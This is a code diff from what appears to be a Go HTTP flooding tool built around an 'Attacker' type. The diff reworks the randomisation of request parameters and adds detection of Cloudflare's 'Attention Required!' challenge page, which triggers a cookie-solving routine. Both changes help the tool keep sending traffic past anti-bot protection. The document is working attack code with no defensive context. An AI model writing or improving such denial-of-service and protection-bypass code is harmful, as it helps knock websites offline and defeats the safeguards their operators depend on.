@@ -73,22 +73,24 @@ func (a *Attacker) SolveCookie() error {
 
 func (a *Attacker) RandomizeData() {
 	var randomizedData string
-	for i, data := range strings.Split(a.attack.Data, "&") {
-		if data == "" {
-			continue
-		}
-		name := strings.Split(data, "=")[0]
-		value := strings.Split(data, "=")[1]
-		if strings.Index(value, "%RAND%") == 0 {
-			randomLength, err := strconv.Atoi(strings.Replace(value, "%RAND%", "", -1))
-			if err != nil {
-				return
+	if len(strings.Split(a.attack.Data, "&")) > 0 {
+		for i, data := range strings.Split(a.attack.Data, "&") {
+			if data == "" {
+				continue
 			}
-			value = RandomString(randomLength)
-		}
-		randomizedData += name + "=" + value
-		if i != len(strings.Split(a.attack.Data, "&"))-1 {
-			randomizedData += "&"
+			name := strings.Split(data, "=")[0]
+			value := strings.Split(data, "=")[1]
+			if strings.Index(value, "%RAND%") == 0 {
+				randomLength, err := strconv.Atoi(strings.Replace(value, "%RAND%", "", -1))
+				if err != nil {
+					return
+				}
+				value = RandomString(randomLength)
+			}
+			randomizedData += name + "=" + value
+			if i != len(strings.Split(a.attack.Data, "&"))-1 {
+				randomizedData += "&"
+			}
 		}
 	}
 	a.data = randomizedData
@@ -266,6 +268,15 @@ func (a *Attacker) CheckResponse(expired chan bool) {
 				continue
 			}
 			if GetTitle(parsed) == "Just a moment..." {
+				a.SolveCookie()
+			}
+		} else if r.StatusCode == 200 {
+			parsed, err := html.Parse(r.Body)
+			if err != nil {
+				time.Sleep(time.Second)
+				continue
+			}
+			if GetTitle(parsed) == "Attention Required! | Cloudflare" {
 				a.SolveCookie()
 			}
 		}
